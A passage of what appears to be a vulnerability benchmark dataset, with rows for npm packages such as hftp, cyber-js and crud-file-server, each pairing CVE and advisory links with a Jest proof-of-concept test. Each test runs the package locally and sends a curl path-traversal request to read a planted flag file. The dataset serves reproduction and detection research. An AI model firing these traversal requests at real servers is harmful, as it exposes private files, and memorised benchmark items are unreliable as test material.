  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let srv = new Server(8080, ""./"", true);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:35:16,https://security.snyk.io/vuln/SNYK-JS-FASTHTTP-572892; https://github.com/advisories/GHSA-7phr-5m9x-rw9q
path-traversal,CVE-2017-16039,hftp,0.0.6,,path-traversal/hftp_0.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hftp"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/hftp/bin/hftp"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  let val = exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
}, 10000);
",,lib/static_server.js:91:16,https://security.snyk.io/vuln/npm:hftp:20170422; https://github.com/advisories/GHSA-76p6-gpvf-6wmv
path-traversal,CVE-2017-16093,cyber-js,1.0.6,,path-traversal/cyber-js_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cyber-js"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node node_modules/cyber-js/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,app.js:43:6,https://security.snyk.io/vuln/npm:cyber-js:20170418; https://github.com/advisories/GHSA-6w83-22gj-5pv9
path-traversal,CVE-2017-16169,looppake,3.0.0,,path-traversal/looppake_3.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in looppake"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/looppake/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:9:8,https://security.snyk.io/vuln/npm:looppake:20170518; https://github.com/advisories/GHSA-4vfj-c2xf-8r48
path-traversal,CVE-2017-16152,static-html-server,0.1.2,,path-traversal/static-html-server_0.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 7788/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in static-html-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 7788/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/static-html-server/static-html-server.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:7788${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,static-html-server.js:60:12,https://security.snyk.io/vuln/npm:static-html-server:20170418; https://github.com/advisories/GHSA-9j5m-873f-xh76
path-traversal,,yypsulie11,1.0.0,,path-traversal/yypsulie11_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yypsulie11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yypsulie11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:9:8,https://security.snyk.io/vuln/npm:yypsulie11:20180306; 
path-traversal,,file-static-server,1.0.2,,path-traversal/file-static-server_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8970/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in file-static-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8970/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/file-static-server/server.js  8970"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8970${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/file.js:88:12,https://security.snyk.io/vuln/npm:file-static-server:20180614; https://github.com/advisories/GHSA-qjfh-xc44-rm9x
path-traversal,,proxey,0.4.2,,path-traversal/proxey_0.4.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in proxey"", (done) => {
  expect.assertions(1);
  const pkg = require(""proxey"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8981/tcp"", () => {});
  } catch (e) {}
  pkg.run({
    rootFolder: ""./"",
    port: 8981,
    proxyUrl: ""/proxy"",
    vars: { ""X-Api-Token"": ""12345"" },
    routes: {
      ""/"": ""home.html"",
      ""/users"": ""users.html"",
      ""/api/users"": ""users.json"",
    },
    charset: ""utf-8"",
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8981${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,proxey.js:191:27,https://security.snyk.io/vuln/npm:proxey:20180306; 
path-traversal,CVE-2017-16160,11xiaoli,1.1.0,,path-traversal/11xiaoli_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in 11xiaoli"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/11xiaoli/dome.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let val = exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
}, 30000);
",,dome.js:5:8,https://security.snyk.io/vuln/npm:11xiaoli:20170509; https://github.com/advisories/GHSA-x2jj-x3q2-7hph
path-traversal,,tinyserver,0.1.1,,path-traversal/tinyserver_0.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8976/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in tinyserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8976/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/tinyserver/lib/main.js 8976"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8976${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/main.js:52:9,https://security.snyk.io/vuln/npm:tinyserver:20170910; 
path-traversal,CVE-2018-3733,crud-file-server,0.7.0,0.9.0,path-traversal/crud-file-server_0.7.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8998/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in crud-file-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8998/tcp"", () => {});
  } catch (e) {}
  let server =
    ""node ./node_modules/crud-file-server/bin/crud-file-server -p 8998"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8998${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/omphalos/crud-file-server/commit/4fc3b404f718abb789f4ce4272c39c7a138c7a82,crud-file-server.js:170:14,https://security.snyk.io/vuln/npm:crud-file-server:20180226; https://github.com/advisories/GHSA-vfp9-gwrh-wq9g
path-traversal,,xbhxbh,1.1.0,,path-traversal/xbhxbh_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xbhxbh"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xbhxbh/xbh.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,xbh.js:8:8,https://security.snyk.io/vuln/npm:xbhxbh:20170910; 
path-traversal,,dilu,0.1.3,,path-traversal/dilu_0.1.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in dilu"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/dilu/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,dilu/get.js:57:21,https://security.snyk.io/vuln/npm:dilu:20180226; 
path-traversal,,cuiaiguang,1.0.0,,path-traversal/cuiaiguang_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cuiaiguang"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cuiaiguang/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:9:12,https://security.snyk.io/vuln/npm:cuiaiguang:20180226; 
path-traversal,CVE-2017-16150,wangguojing123,1.3.0,,path-traversal/wangguojing123_1.3.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wangguojing123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wangguojing123/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:10:8,https://security.snyk.io/vuln/npm:wangguojing123:20170518; https://github.com/advisories/GHSA-xpqw-fqpw-35fc
path-traversal,,sleep,^6.3.0,,path-traversal/starfruit_0.2.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in starfruit"", (done) => {
  expect.assertions(1);
  var pkg = require('starfruit');
  const fs = require(""fs"");
  const { sleep } = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  app = pkg();
  app.listen(8080);
  sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,,https://security.snyk.io/vuln/npm:starfruit:20180315; 
path-traversal,,serversyysyy,1.1.0,,path-traversal/serversyysyy_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serversyysyy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serversyysyy/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",,index.js:18:8,https://security.snyk.io/vuln/npm:serversyysyy:20180315; 
path-traversal,,atropa-ide,0.2.2-2,,path-traversal/atropa-ide_0.2.2-2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in atropa-ide"", (done) => {
  expect.assertions(1);
  const ide = require(""atropa-ide"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8884/tcp"", () => {});
  } catch (e) {}
  const path = require(""path"");
  let port = 8884;
  let serverRoot = path.resolve(__dirname);
  ide.start(port, serverRoot);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8884${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,,https://security.snyk.io/vuln/npm:atropa-ide:20180226; 
path-traversal,CVE-2017-16083,node-simple-router,0.10.0,0.10.1,path-traversal/node-simple-router_0.10.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-simple-router"", (done) => {
  expect.assertions(1);
  const Router = require(""node-simple-router"");
  const http = require(""http"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8985/tcp"", () => {});
  } catch (e) {}
  let router = new Router({
    static_route: process.cwd(),
    cgi_dir: ""cgi-bin"",
    use_nsr_session: false,
    default_home: [],
  });
  const server = http.createServer(router);
  server.listen(8985);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8985${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/sandy98/node-simple-router/commit/dfdd52e2e80607af433097d940b3834fd96df488,lib/router.js:757:27,https://security.snyk.io/vuln/npm:node-simple-router:20170523; https://github.com/advisories/GHSA-5w8q-x7hc-jhp6
path-traversal,,nopach,0.1.1,,path-traversal/nopach_0.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nopach"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/nopach/lib/nopach.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,nopach.js:159:25,https://security.snyk.io/vuln/npm:nopach:20170910; 
path-traversal,,pico-static-server,2.3.4,3.0.2,path-traversal/pico-static-server_2.3.4,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in pico-static-server"", (done) => {
  expect.assertions(1);
  const createServer = require(""pico-static-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8982/tcp"", () => {});
  } catch (e) {}
  const staticServer = createServer({
    defaultFile: ""index.html"",
    staticPath: ""."",
    port: 8982,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8982${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:118:23,https://security.snyk.io/vuln/npm:pico-static-server:20180226; 
path-traversal,CVE-2017-16181,wintiwebdev,1.0.0,,path-traversal/wintiwebdev_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wintiwebdev"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wintiwebdev/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,app.js:16:6,https://security.snyk.io/vuln/npm:wintiwebdev:20170521; https://github.com/advisories/GHSA-g5m5-v5cp-5p7m
path-traversal,CVE-2017-16223,nodeaaaaa,1.3.0,,path-traversal/nodeaaaaa_1.3.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nodeaaaaa"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/nodeaaaaa/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:11:8,https://security.snyk.io/vuln/npm:nodeaaaaa:20170430; https://github.com/advisories/GHSA-xj3h-vc9j-j823
path-traversal,CVE-2017-16123,welcomyzt,1.1.0,,path-traversal/welcomyzt_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9987/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in welcomyzt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9987/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/welcomyzt/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9987${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:5:8,https://security.snyk.io/vuln/npm:welcomyzt:20170617; https://github.com/advisories/GHSA-8fv7-vm2p-5495
path-traversal,,zhangranbigman,0.0.1,,path-traversal/zhangranbigman_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9999/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhangranbigman"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9999/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhangranbigman/run.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,my-lib/lib/static.js:21:6,https://security.snyk.io/vuln/npm:zhangranbigman:20180226; 
path-traversal,CVE-2017-16182,serverxxx,1.0.0,,path-traversal/serverxxx_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverxxx"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverxxx/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:12:8,https://security.snyk.io/vuln/npm:serverxxx:20170612; https://github.com/advisories/GHSA-wh33-4p32-g7vh
path-traversal,CVE-2017-16170,liuyaserver,1.0.0,,path-traversal/liuyaserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 4848/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in liuyaserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 4848/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/liuyaserver/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:4848${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:7:8,https://security.snyk.io/vuln/npm:liuyaserver:20170521; https://github.com/advisories/GHSA-xj6q-9hx8-mm7f
path-traversal,CVE-2017-16168,wffserve,1.0.0,,path-traversal/wffserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
